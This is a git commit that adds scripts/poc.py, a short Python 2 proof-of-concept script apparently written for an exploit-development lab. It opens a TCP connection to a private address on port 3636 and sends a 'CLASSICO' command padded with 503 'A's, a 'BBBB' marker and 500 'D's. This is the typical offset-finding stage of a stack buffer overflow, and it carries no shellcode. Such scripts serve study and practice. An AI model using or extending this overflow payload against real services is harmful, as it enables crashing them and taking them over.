febe1fc8f848b785111905e76abba46713034b3c
mx61tt <56231649+mx61tt@users.noreply.github.com>
2020-06-20 18:48:03 -0300

    Create poc.py

---
+++ scripts/poc.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python                                                                                                                                                                                                                          
+import socket                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+IP="10.0.2.13"                                                                                                                                                                                                                             
+PORTA=3636                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+payload = "A" * 503                                                                                                                                                                                                                        
+payload += "BBBB"                                                                                                                                                                                                                          
+payload += "D" * 500                                                                                                                                                                                                                       
+
+buffer = "CLASSICO "
+buffer += payload
+
+print "[+] Enviando..."
+
+r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+r.connect((IP,PORTA))
+
+r.send(buffer)
+
+r.close()
